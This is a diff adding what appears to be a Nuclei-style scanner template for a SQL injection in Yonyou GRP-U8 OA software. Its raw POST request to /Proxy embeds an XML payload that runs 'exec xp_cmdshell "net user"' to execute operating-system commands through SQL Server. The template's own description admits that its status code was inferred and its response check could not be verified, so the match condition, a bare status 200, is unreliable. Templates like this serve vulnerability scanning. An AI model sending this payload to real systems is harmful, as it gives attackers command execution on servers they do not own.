@@ -1,0 +1,44 @@
+id: poc-psvugh3a2gknogg7
+info:
+  name: 用友 OA nc GRP-u8 sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/psvugh3a2gknogg7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: psvugh3a2gknogg7
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /Proxy HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    Guest
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
